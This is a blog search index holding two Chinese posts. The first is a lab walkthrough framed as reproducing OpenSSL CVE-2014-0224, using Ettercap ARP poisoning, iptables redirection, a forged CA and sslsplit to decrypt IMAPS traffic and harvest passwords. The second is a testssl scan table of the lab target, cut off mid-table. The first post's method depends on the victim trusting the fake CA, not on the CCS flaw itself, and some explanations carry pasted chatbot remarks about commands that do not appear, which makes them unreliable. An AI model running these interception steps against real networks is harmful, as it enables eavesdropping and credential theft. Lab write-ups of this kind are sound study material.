<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2014-0224复现流程</title>
    <url>/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="什么是CCS注入漏洞？"><a href="#什么是CCS注入漏洞？" class="headerlink" title="什么是CCS注入漏洞？"></a>什么是CCS注入漏洞？</h3><p>  CCS注入漏洞（CVE-2014-0224这是流行的 OpenSSL 加密软件库中的一个严重漏洞。OpenSSL 是 SSL&#x2F;TLS 加密协议的实现，用于保护互联网通信的隐私。许多网站和其他应用程序（例如电子邮件、即时通讯和 VPN）都使用 OpenSSL。</p>
<p>  在某些版本的 OpenSSL 中，攻击者可以利用精心构造的握手协议，强制 OpenSSL SSL&#x2F;TLS 客户端和服务器使用弱密钥材料。这可被中间人 (MITM) 攻击利用，攻击者可以解密并篡改来自受攻击客户端和服务器的流量。</p>
<h3 id="CCS注入漏洞会影响哪些人？"><a href="#CCS注入漏洞会影响哪些人？" class="headerlink" title="CCS注入漏洞会影响哪些人？"></a>CCS注入漏洞会影响哪些人？</h3><p>  最近的报告显示，该漏洞至少存在了十年，但直到最近才被发现。由于许多组织部署了运行 OpenSSL 的服务器，因此，那些关注或受到最近 Heartbleed 漏洞影响的公司可能也应该认真考虑这个漏洞。</p>
<p>影响版本：OpenSSL 0.9.8za 之前的版本、1.0.0m 之前的 1.0.0 版本以及 1.0.1h 之前的 1.0.1 版本</p>
<h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><p>要利用此漏洞，通常需要满足以下条件：</p>
<ul>
<li><strong>客户端和服务器都必须易受攻击</strong>：即双方都运行着受影响版本的 OpenSSL。如果仅有一方受影响，握手通常会失败。</li>
<li><strong>中间人位置</strong>：攻击者必须处于能够拦截和修改网络流量的位置。</li>
</ul>
<p>网络拓扑图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        [ 虚拟交换机 / 网关 ]</span><br><span class="line">        (Virtual Switch / Gateway)</span><br><span class="line">      (通常是 .1 或 .2, 负责流量转发)</span><br><span class="line">                 |</span><br><span class="line">    +------------+----------------------+----------------------+</span><br><span class="line">    |                                   |                      |</span><br><span class="line">[ Ubuntu (客户端) ]               [ Kali (攻击者) ]        [ Vulnix (靶机/服务端) ]</span><br><span class="line">IP: 192.168.137.129             IP: 192.168.137.132      IP: 192.168.137.133</span><br><span class="line">MAC: AA:BB:CC:..:..             MAC: 攻击者MAC           MAC: 目标MAC</span><br><span class="line">(高版本 OS)                      (运行 Ettercap)          (存在 OpenSSL 漏洞)</span><br></pre></td></tr></table></figure>



<h1 id="中间人攻击过程演示"><a href="#中间人攻击过程演示" class="headerlink" title="中间人攻击过程演示"></a>中间人攻击过程演示</h1><h2 id="第-1-阶段：环境初始化（物理层）"><a href="#第-1-阶段：环境初始化（物理层）" class="headerlink" title="第 1 阶段：环境初始化（物理层）"></a>第 1 阶段：环境初始化（物理层）</h2><p><strong>目标：</strong> 确保三台机器在同一个纯净的局域网内，且 IP 互通。</p>
<h3 id="1-1-虚拟机网络设置"><a href="#1-1-虚拟机网络设置" class="headerlink" title="1.1 虚拟机网络设置"></a>1.1 虚拟机网络设置</h3><ul>
<li><p><strong>操作：</strong> 打开 VMware，将 Kali、Ubuntu、Vulnix 三台虚拟机的网络适配器<strong>全部设置为「NAT 模式」</strong>。</p>
</li>
<li><p><strong>原因：</strong> 桥接模式受路由器影响太大，NAT 模式能提供最稳定的实验环境。</p>
</li>
<li><h3 id="1-2-确认-IP-地址"><a href="#1-2-确认-IP-地址" class="headerlink" title="1.2 确认 IP 地址"></a>1.2 确认 IP 地址</h3><p>在kali和ubuntu和vulnix机器终端分别输入 <code>ip addr</code>。请记下你的 IP</p>
<ul>
<li><p><strong>Kali (攻击者):</strong> <code>192.168.137.132</code></p>
</li>
<li><p><strong>Ubuntu (受害者):</strong> <code>192.168.137.129</code></p>
</li>
<li><p><strong>vulnix</strong> <strong>(服务端)</strong>：192.168.137.133</p>
</li>
<li><p>首先三台机子是ping 通的因为在同一网关下</p>
<p>在实验开始之前，我要确定服务端是否有这个漏洞,先扫这个靶机有ccs这个漏洞的端口</p>
<p>输入指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p- 192.168.137.133</span><br></pre></td></tr></table></figure>

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251209211011957.png" class="" title="nmap扫描结果"></li>
</ul>
</li>
</ul>
<p>因为ccs漏洞是tls上的，可以看到端口995，993可能会有这个漏洞，所以这两个端口都要扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 993,995 --script ssl-ccs-injection 192.168.137.133</span><br></pre></td></tr></table></figure>

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251209211454223.png" class="" title="nmap漏洞脚本扫描">

<p>可以发现: Vulnix 靶机 (192.168.137.133) 上的 IMAPS 服务 (端口 993) 和 POP3S 服务 (端口 995) 确定存在 CCS 注入漏洞 (CVE-2014-0224)。</p>
<h2 id="第-2-阶段：实现中间人欺骗环境"><a href="#第-2-阶段：实现中间人欺骗环境" class="headerlink" title="第 2 阶段：实现中间人欺骗环境"></a>第 2 阶段：实现中间人欺骗环境</h2><h3 id="启动-Ettercap"><a href="#启动-Ettercap" class="headerlink" title="启动 Ettercap"></a>启动 Ettercap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ettercap -G</span><br></pre></td></tr></table></figure>

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251129145138663.png" class="" title="启动Ettercap">

<p>这里我选择默认的网段eth0,按上面的对勾就是启动了服务</p>
<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251129145311864.png" class="" title="Ettercap界面">

<p>1.<strong>扫描主机：</strong> 点击左上角的 <strong>放大镜图标</strong> (Scan for hosts)。他会扫描一切主机</p>
<p>2.按放大镜右边那个Host List，可以看到我的网关和客户端和服务端两台主机（这个列表默认是没有本机：kali）</p>
<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211181711093.png" class="" title="HostList">

<p>3.<strong>选定目标：</strong></p>
<ul>
<li><p>选中 <strong>192.168.137.129</strong> (Ubuntu)，点击下方的 <strong>Add to Target 1</strong>。</p>
</li>
<li><p>选中 <strong>192.168.137.133</strong> (Vulnix)，点击下方的 <strong>Add to Target 2</strong>。</p>
<p>为什么这么选呢？</p>
<p>之所以要这样设置 Target 1 和 Target 2，是因为 Ettercap 需要明确“我们要在这个双向通信的链路中欺骗谁和谁”。只是一个指定目标的意思。</p>
<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211182439066.png" class="" title="设置Target"></li>
</ul>
<p>从下面输出的可以看出已经指定目标了</p>
<p>4.开始arp欺骗:</p>
<ul>
<li><p>点击右上角的 <strong>地球图标</strong> (MITM Menu)。</p>
</li>
<li><p>选择 <strong>ARP poisoning</strong>。</p>
</li>
<li><p><strong>关键：</strong> 勾选 <strong>Sniff remote connections</strong> -&gt; 点击 <strong>OK</strong>。</p>
</li>
</ul>
<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211182746240.png" class="" title="选择ARP欺骗">

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211182819879.png" class="" title="勾选Sniff">

<p>ARP Poisoning  :arp欺骗</p>
<p>Sniff remote connections：嗅探远程连接，监听那些仅仅是“路过”我电脑的流量。</p>
<p>但是我们所用的监听工具是sslsplit后面会提到。</p>
<p>5.这是展现的是流量转发，使客户端可以上网</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211183852053.png" class="" title="开启转发">
<p>6.<strong>创建伪造的 CA 证书</strong>:<br><code>sslsplit</code> 需要使用自签名的证书来欺骗客户端，假装自己是真正的服务器。<br>在 Kali 的 <code>~/Desktop</code> 目录下执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/Desktop</span><br><span class="line">openssl genrsa -out ca.key 2048 # 生成私钥</span><br><span class="line"># 生成自签名证书，一路回车接受默认值，或自定义 Common Name (CN)</span><br><span class="line">openssl req -new -x509 -days 365 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure>

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211184732478.png" class="" title="生成证书">

<p>这里我把原来以前生成过的删掉了，重新生成了一次，可以看到桌面上的ca.crt和ca.key,因为只是测试，所以证书随便填。</p>
<p>7.<strong>配置 <code>iptables</code> 规则</strong>:<br>将目标为 Vulnix IMAPS (993) 端口（有漏洞的端口）的流量重定向到 Kali 本地 <code>sslsplit</code> 监听的端口 (例如 8993)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo iptables -t nat -F # 清除所有旧的 NAT 规则</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-port 8993</span><br></pre></td></tr></table></figure>

<p>8.<strong>启动 <code>sslsplit</code></strong>:</p>
<p><strong>SSLsplit 是什么？</strong><br><strong>SSLsplit 是一个透明的 SSL&#x2F;TLS 中间人攻击（MitM）工具。</strong></p>
<p><strong>它的角色：它就像一个“伪装的翻译官”。</strong><br><strong>它的工作原理：</strong><br><strong>当受害者（Ubuntu）想和服务器（Vulnix）建立加密连接（SSL握手）时，流量被 iptables 强行转给了 SSLsplit。</strong><br><strong>对内欺骗：SSLsplit 假装自己是服务器，拿出一个（伪造的）证书和受害者建立连接。</strong><br><strong>对外连接：SSLsplit 同时作为客户端，真正去连接远程服务器。</strong><br><strong>中间操作：受害者发来的加密数据，SSLsplit 解密成明文（记录下来），然后再加密发给真正的服务器。</strong><br><strong>简单来说：SSLsplit 负责把“加密的信封”拆开，看完内容后，再换个新信封封好发出去。</strong></p>
<p><strong>这将是流量解密和记录的核心工具。</strong></p>
<ul>
<li><p><strong>终端 3 (Kali)</strong>: 创建日志目录并以前台模式启动 <code>sslsplit</code>。</p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /tmp/sslsplit-mail-logs/logdir</span><br><span class="line">sudo sslsplit -l /tmp/sslsplit-mail-logs/connections.log \</span><br><span class="line">             -j /tmp/sslsplit-mail-logs/ \</span><br><span class="line">             -S /tmp/sslsplit-mail-logs/logdir/ \</span><br><span class="line">             -k ~/Desktop/ca.key \</span><br><span class="line">             -c ~/Desktop/ca.crt \</span><br><span class="line">             ssl 0.0.0.0 8993 192.168.137.133 993</span><br></pre></td></tr></table></figure>

<p><code>sslsplit</code> 会“卡住”在此终端，表示它已成功启动并正在监听。<strong>保持此终端运行。</strong></p>
<p>下面是对这段代码的解释：</p>
</li>
</ul>
<p>这段命令是 <strong>启动 SSLsplit 进行攻击</strong> 的核心步骤。作为软件工程师，我们可以把它看作是在<strong>启动一个高性能的服务器后端进程</strong>，并详细配置了它的日志系统、证书凭证以及监听端口。</p>
<p>这段代码分为两部分：创建目录和启动程序。我们逐行拆解：</p>
<hr>
<h3 id="第一部分：准备工作"><a href="#第一部分：准备工作" class="headerlink" title="第一部分：准备工作"></a>第一部分：准备工作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /tmp/sslsplit-mail-logs/logdir</span><br></pre></td></tr></table></figure>
<ul>
<li><strong><code>mkdir</code></strong>: 创建目录 (Make Directory)。</li>
<li><strong><code>-p</code></strong>: 级联创建。意思是如果父目录 <code>/tmp/sslsplit-mail-logs</code> 不存在，就自动把它也建好，不要报错。</li>
<li><strong>目的</strong>：为 SSLsplit 准备好存放“赃物”（截获的数据和日志）的文件夹。</li>
</ul>
<hr>
<h3 id="第二部分：启动-SSLsplit"><a href="#第二部分：启动-SSLsplit" class="headerlink" title="第二部分：启动 SSLsplit"></a>第二部分：启动 SSLsplit</h3><p>这是一个长命令，通过反斜杠 <code>\</code> 换行。我们按参数拆解：</p>
<h4 id="1-基础日志配置"><a href="#1-基础日志配置" class="headerlink" title="1. 基础日志配置"></a>1. 基础日志配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sslsplit -l /tmp/sslsplit-mail-logs/connections.log \</span><br></pre></td></tr></table></figure>
<ul>
<li><strong><code>sudo sslsplit</code></strong>: 以管理员权限运行攻击工具。</li>
<li><strong><code>-l .../connections.log</code></strong>: <strong>连接日志 (Log)</strong>。<ul>
<li>这里记录的是**“谁连了我”**。</li>
<li>内容包括：时间戳、源IP、目标IP、连接是否成功等元数据。就好比是公司的“访客登记表”。</li>
</ul>
</li>
</ul>
<h4 id="2-内容截获配置-核心功能"><a href="#2-内容截获配置-核心功能" class="headerlink" title="2. 内容截获配置 (核心功能)"></a>2. 内容截获配置 (核心功能)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-j /tmp/sslsplit-mail-logs/ \</span><br><span class="line">-S /tmp/sslsplit-mail-logs/logdir/ \</span><br></pre></td></tr></table></figure>
<p>这里是 SSLsplit 最强大的地方，它会把截获的内容存下来：</p>
<ul>
<li><strong><code>-j /path/to/dir/</code> (Jail&#x2F;chroot directory)</strong>:<ul>
<li>虽然官方文档中 <code>-j</code> 主要是用于 <code>chroot</code> (隔离运行环境以提高安全性)，但在某些版本的上下文中，它常配合内容记录使用。不过在攻击场景中，我们更关注下面的 <code>-S</code>。</li>
</ul>
</li>
<li><strong><code>-S .../logdir/</code> (Log Streams)</strong>: <strong>内容日志</strong>。<ul>
<li><strong>含义</strong>：把每一条流经的 TCP 连接的数据内容，<strong>完整地保存成独立的文件</strong>。</li>
<li><strong>效果</strong>：如果受害者发了邮件，邮件的正文、密码、附件，都会被写入这个目录下的文件中。这才是我们找密码要去翻的地方。</li>
</ul>
</li>
</ul>
<h4 id="3-伪造证书配置-欺骗核心"><a href="#3-伪造证书配置-欺骗核心" class="headerlink" title="3. 伪造证书配置 (欺骗核心)"></a>3. 伪造证书配置 (欺骗核心)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-k ~/Desktop/ca.key \</span><br><span class="line">-c ~/Desktop/ca.crt \</span><br></pre></td></tr></table></figure>
<p>这是中间人攻击能否成功的关键：</p>
<ul>
<li><strong><code>-k ...ca.key</code> (Key)</strong>: 指定你的 <strong>CA 私钥</strong>。</li>
<li><strong><code>-c ...ca.crt</code> (Certificate)</strong>: 指定你的 <strong>CA 证书</strong>。</li>
<li><strong>原理</strong>：SSLsplit 需要在受害者和服务器之间“实时伪造”证书。它使用你提供的这个 CA（证书授权中心）的私钥，来动态签署伪造的证书。<ul>
<li><em>注：前提是你已经想办法把这个 <code>ca.crt</code> 安装到了受害者的电脑上并建立了信任，否则受害者的浏览器会弹窗警告“证书不安全”。</em></li>
</ul>
</li>
</ul>
<h4 id="4-监听与转发配置"><a href="#4-监听与转发配置" class="headerlink" title="4. 监听与转发配置"></a>4. 监听与转发配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssl 0.0.0.0 8993 192.168.137.133 993</span><br></pre></td></tr></table></figure>
<p>这一行定义了 SSLsplit 的工作模式和流量走向，格式通常是：<code>[协议] [监听地址] [监听端口] [目标IP] [目标端口]</code>。<br><em>(注意：这里你给出的命令看起来像是处于“静态转发”模式，或者是一个特定版本的用法，因为它显式指定了目标 IP 133)</em></p>
<ul>
<li><strong><code>ssl</code></strong>: 告诉工具，我要处理的是 SSL&#x2F;TLS 加密流量。</li>
<li><strong><code>0.0.0.0</code></strong>: 监听本机的所有网卡接口。</li>
<li><strong><code>8993</code></strong>: <strong>监听端口</strong>。<ul>
<li>SSLsplit 会在这个端口等待数据。</li>
<li><em>（这里有一个疑点：之前的 iptables 命令是转到 8443，这里却是 8993。请务必检查你的 iptables 规则是否也对应修改为了 8993，或者这是针对 IMAPS 协议的另一条规则？）</em></li>
</ul>
</li>
<li><strong><code>192.168.137.133 993</code></strong>: <strong>目标转发地址</strong>。<ul>
<li><strong>含义</strong>：凡是发到我这里的数据，解密记录后，重新加密发给 <code>133</code> (Vulnix) 的 <code>993</code> 端口。</li>
<li><strong>993 端口</strong>：通常是 <strong>IMAPS</strong> (加密的邮件接收协议)，区别于之前的 995 (POP3S)</li>
</ul>
</li>
</ul>
<h2 id="阶段三：在受害机上触发连接-Ubuntu"><a href="#阶段三：在受害机上触发连接-Ubuntu" class="headerlink" title="阶段三：在受害机上触发连接 (Ubuntu)"></a>阶段三：在受害机上触发连接 (Ubuntu)</h2><p>现在，在 Ubuntu 受害机上模拟用户连接 IMAPS 服务。</p>
<ol>
<li><p><strong>打开 Ubuntu 终端</strong>。</p>
</li>
<li><p><strong>使用 <code>openssl s_client</code> 连接 Vulnix IMAPS 服务</strong>:<br>由于 Vulnix 使用老旧的加密算法，现代 Ubuntu 的 OpenSSL 客户端可能会因安全级别过高而拒绝连接。我们需要降低客户端的安全级别以兼容。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl s_client -connect 192.168.137.133:993 -crlf -cipher &#x27;DEFAULT:@SECLEVEL=1&#x27;</span><br></pre></td></tr></table></figure>

<p>下面是代码的详解：</p>
<ol>
<li><p>openssl<br> 含义：这是 Linux 下最著名的开源密码学工具包。<br> 作用：它是整个命令的入口，提供了生成证书、计算哈希、加密解密以及测试 SSL&#x2F;TLS 连接的所有功能。</p>
</li>
<li><p>s_client<br> 含义：这是 OpenSSL 工具包中的一个子命令 (Sub-command)。<br> 作用：它实现了一个通用的 SSL&#x2F;TLS 客户端。<br> 类比：你可以把它想象成加密版的 Telnet 或 Netcat。它负责建立 TCP 连接，然后立刻进行 SSL 握手，把连接变成加密通道。握手成功后，它允许你通过键盘输入数据发送给服务器。</p>
</li>
<li><p>-connect 192.168.137.133:993<br> 含义：指定目标。<br> 192.168.137.133：目标服务器的 IP 地址（你的靶机）。<br> 993：目标端口。<br> 993 是 IMAPS (IMAP over SSL) 的标准端口。<br> 如果是 143，通常是未加密的 IMAP 或 STARTTLS。<br> 这里指定 993，说明我们预期服务器一上来就会跟我们进行 SSL 握手。</p>
</li>
<li><p>-crlf<br> 含义：非常关键的格式转换。将换行符转换为 CR + LF。<br> 背景：<br> Linux&#x2F;Unix 系统（你的 Kali）默认按下回车键只发送 LF (\n, Line Feed)。<br> 网络协议标准（如 HTTP, SMTP, IMAP, POP3）严格要求行尾必须是 CR + LF (\r\n, Carriage Return + Line Feed)。<br> 为什么要加：如果不加这个参数，当你输入 a001 LOGIN user pass 并回车时，OpenSSL 只会发送 \n。老旧或严格的服务器（比如 Dovecot）会认为“这句话还没说完”，一直傻等着你发 \r，导致你觉得卡死或者报错。这个参数能确保你按回车时，服务器能收到正确的“结束符”。</p>
</li>
<li><p>-cipher ‘DEFAULT:@SECLEVEL&#x3D;1’<br> 含义：降低安全等级，允许使用弱加密算法。<br> 背景：<br> Kali (OpenSSL 3.x)：现在的 Kali Linux 使用的是很新的 OpenSSL 版本，默认的安全级别（SECLEVEL）通常是 2。它会禁止使用不安全的旧算法（如 SHA1 签名、1024位以下的 RSA 密钥、弱 DH 参数）。<br> Vulnix (靶机)：这是一个老旧的系统，它的 SSL 证书可能是很久以前生成的（比如用的是 SHA1），或者它的密钥长度只有 1024 位。<br> 冲突：如果用默认设置去连，Kali 会报错说：“对方太不安全了，我不跟它说话”（通常报错 dh key too small 或 ca md too weak）。<br> @SECLEVEL&#x3D;1 的作用：这就是在告诉你的 OpenSSL 客户端：“别那么挑剔，把安全标准降到 1 级，允许连接那些老旧、不安全的服务器。</p>
</li>
</ol>
<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211205806438.png" class="" title="连接成功截图1">

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211205824952.png" class="" title="连接成功截图2">

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211205918185.png" class="" title="交互过程1">

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211205939532.png" class="" title="交互过程2">

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-12-11%20210418.png" class="" title="最终结果">

<p>这时候ssl会抓取到一些东西：</p>
<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211210511800.png" class="" title="抓取数据">

<h2 id="阶段四：查看解密后的数据-Kali"><a href="#阶段四：查看解密后的数据-Kali" class="headerlink" title="阶段四：查看解密后的数据 (Kali)"></a>阶段四：查看解密后的数据 (Kali)</h2><p>1.查看 <code>sslsplit</code> 记录的日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp/sslsplit-mail-logs/logdir/</span><br><span class="line">cat $(ls -t | head -n1) # 查看最新的日志文件</span><br></pre></td></tr></table></figure>

<img src="/2026/01/01/CVE-2014-0224%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B/image-20251211210958399.png" class="" title="查看日志">
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>CVE-2014-0224</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnix常用靶机用testssl扫描结果</title>
    <url>/2026/01/01/Vulnix%20993%20SSLTLS%20%E5%AE%89%E5%85%A8%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<think>

</think>
使用了testssl.sh-3.3
参照网址：https://github.com/testssl/testssl.sh

<hr>
<h3 id="Vulnix-192-168-137-133-993-SSL-TLS-安全扫描结果汇总"><a href="#Vulnix-192-168-137-133-993-SSL-TLS-安全扫描结果汇总" class="headerlink" title="Vulnix (192.168.137.133:993) SSL&#x2F;TLS 安全扫描结果汇总"></a>Vulnix (192.168.137.133:993) SSL&#x2F;TLS 安全扫描结果汇总</h3><p><strong>扫描时间:</strong> 2025-12-03 08:10:02 - 08:10:57 (总耗时 56s)<br><strong>目标服务:</strong> IMAP<br><strong>OpenSSL版本 (客户端检测):</strong> OpenSSL 1.0.2-bad (Mar 28 2025)<br><strong>总体评级:</strong> T (信任问题)</p>
<hr>
<h3 id="表格一：支持的-SSL-TLS-协议和密码套件-协议和Cipher-Categories部分"><a href="#表格一：支持的-SSL-TLS-协议和密码套件-协议和Cipher-Categories部分" class="headerlink" title="表格一：支持的 SSL&#x2F;TLS 协议和密码套件 (协议和Cipher Categories部分)"></a>表格一：支持的 SSL&#x2F;TLS 协议和密码套件 (协议和Cipher Categories部分)</h3><table>
<thead>
<tr>
<th align="left">类别</th>
<th align="left">项目</th>
<th align="left">状态 &#x2F; 结果</th>
<th align="left">严重性 &#x2F; 建议</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>协议支持</strong></td>
<td align="left">SSLv2</td>
<td align="left"><code>not offered (OK)</code> (未提供)</td>
<td align="left">正常，安全。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">SSLv3</td>
<td align="left"><code>offered (NOT ok)</code> (已提供)</td>
<td align="left"><strong>高危</strong>。完全过时，存在 POODLE 漏洞风险，应立即禁用。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">TLS 1.0</td>
<td align="left"><code>offered (deprecated)</code> (已提供，已弃用)</td>
<td align="left"><strong>中危</strong>。已过时，存在已知缺陷，应禁用。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">TLS 1.1</td>
<td align="left"><code>offered (deprecated)</code> (已提供，已弃用)</td>
<td align="left"><strong>中危</strong>。已过时，存在已知缺陷，应禁用。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">TLS 1.2</td>
<td align="left"><code>offered (OK)</code> (已提供)</td>
<td align="left">正常，目前建议支持。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">TLS 1.3</td>
<td align="left"><code>not offered and downgraded to a weaker protocol</code> (未提供)</td>
<td align="left"><strong>低危</strong>。不支持最新、最安全的协议。建议升级支持 TLS 1.3 以提高安全性。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">NPN&#x2F;SPDY</td>
<td align="left"><code>not offered</code> (未提供)</td>
<td align="left">正常，与 HTTP&#x2F;2&#x2F;3 相关，不影响 IMAP。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">ALPN&#x2F;HTTP2</td>
<td align="left"><code>not offered</code> (未提供)</td>
<td align="left">正常，与 HTTP&#x2F;2&#x2F;3 相关，不影响 IMAP。</td>
</tr>
<tr>
<td align="left"><strong>密码套件类别</strong></td>
<td align="left">NULL ciphers</td>
<td align="left"><code>not offered (OK)</code> (未提供)</td>
<td align="left">正常，安全（无加密）。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Anonymous NULL</td>
<td align="left"><code>not offered (OK)</code> (未提供)</td>
<td align="left">正常，安全（无认证）。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Export ciphers</td>
<td align="left"><code>not offered (OK)</code> (未提供)</td>
<td align="left">正常，安全（导出级弱加密）。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">LOW: 64 Bit + DES, RC[2,4], MD5</td>
<td align="left"><code>offered (NOT ok)</code> (已提供)</td>
<td align="left"><strong>高危</strong>。提供低强度（64位、DES、RC4、MD5）密码套件。极易被暴力破解，应立即禁用。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Triple DES &#x2F; IDEA</td>
<td align="left"><code>offered</code> (已提供)</td>
<td align="left"><strong>中危</strong>。提供 3DES&#x2F;IDEA 密码套件。这些算法存在性能问题且易受 SWEET32 攻击。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Obsoleted CBC</td>
<td align="left"><code>offered</code> (已提供)</td>
<td align="left"><strong>中危</strong>。提供已过时的 CBC 模式密码套件。易受 BEAST、POODLE、LUCKY13 攻击。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Strong (AEAD) no FS</td>
<td align="left"><code>offered (OK)</code> (已提供)</td>
<td align="left">正常，提供强加密（AEAD）密码套件。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Strong (AEAD) FS</td>
<td align="left"><code>offered (OK)</code> (已提供)</td>
<td align="left">正常，提供强加密（AEAD）和前向保密（FS）密码套件。</td>
</tr>
<tr>
<td align="left"><strong>密码套件偏好</strong></td>
<td align="left">服务器密码顺序</td>
<td align="left"><code>no (NOT ok)</code> (无)</td>
<td align="left"><strong>中危</strong>。服务器未强制自己的密码套件顺序，可能导致客户端选择弱密码套件。应配置服务器强制使用安全密码套件的优先顺序。</td>
</tr>
<tr>
<td align="left"><strong>证书信息</strong></td>
<td align="left">签名算法</td>
<td align="left"><code>SHA1 with RSA</code></td>
<td align="left"><strong>高危</strong>。SHA1 哈希算法已不安全，存在碰撞风险，主流浏览器已不信任 SHA1 证书。应使用 SHA256 或更强的算法。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">SAN</td>
<td align="left"><code>missing -- no SAN is deprecated</code></td>
<td align="left"><strong>中危</strong>。缺少主题备用名称 (SAN) 字段。SAN 是现代证书匹配域名的标准，缺失会导致客户端警告。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">信任链</td>
<td align="left"><code>NOT ok (self signed)</code> (自签名)</td>
<td align="left"><strong>严重</strong>。证书是自签名的，不被任何公共信任机构认可。导致所有客户端都会警告连接不安全，且易受中间人攻击。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">证书有效期</td>
<td align="left"><code>expired (2012-09-02 --&gt; 2022-09-02)</code> (已过期)</td>
<td align="left"><strong>严重</strong>。证书已过期。任何客户端都会拒绝连接或发出严重警告。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">证书有效期长度</td>
<td align="left"><code>&gt;= 10 years is way too long</code> (10年以上)</td>
<td align="left"><strong>策略问题</strong>。证书有效期过长，与当前安全最佳实践（1-2年）不符，增加了长期风险。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">OCSP &#x2F; CRL</td>
<td align="left"><code>NOT ok -- neither CRL nor OCSP URI provided</code> (未提供)</td>
<td align="left"><strong>中危</strong>。未提供证书吊销信息。无法及时检查证书是否已被吊销，可能导致已泄露或滥用的证书仍被信任。</td>
</tr>
<tr>
<td align="left"><strong>密钥信息</strong></td>
<td align="left">服务器密钥大小</td>
<td align="left"><code>RSA 2048 bits</code> (2048位)</td>
<td align="left">正常，目前普遍接受的密钥大小。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">DH 组</td>
<td align="left"><code>Unknown DH group (1024 bits)</code> (未知DH组，1024位)</td>
